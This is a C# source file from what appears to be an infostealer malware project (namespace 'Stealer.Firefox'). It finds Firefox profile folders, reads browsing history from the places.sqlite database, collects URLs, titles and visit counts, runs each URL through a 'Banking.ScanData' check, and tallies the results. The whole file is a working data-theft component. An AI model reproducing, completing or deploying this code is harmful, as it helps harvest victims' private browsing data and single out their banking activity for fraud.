using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Firefox;

internal class cHistory
{
	private static string GetHistoryDBPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\places.sqlite"))
					{
						return text + "\\places.sqlite";
					}
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static List<Site> Get(string path)
	{
		List<Site> list = new List<Site>();
		try
		{
			string historyDBPath = GetHistoryDBPath(path);
			SQLite sQLite = SqlReader.ReadTable(historyDBPath, "moz_places");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Site item = default(Site);
				item.sTitle = Crypto.GetUTF8(sQLite.GetValue(i, 2));
				item.sUrl = Crypto.GetUTF8(sQLite.GetValue(i, 1));
				item.iCount = Convert.ToInt32(sQLite.GetValue(i, 4)) + 1;
				if (item.sTitle != "0")
				{
					Banking.ScanData(item.sUrl);
					Counter.History++;
					list.Add(item);
				}
			}
			return list;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return new List<Site>();
	}
}
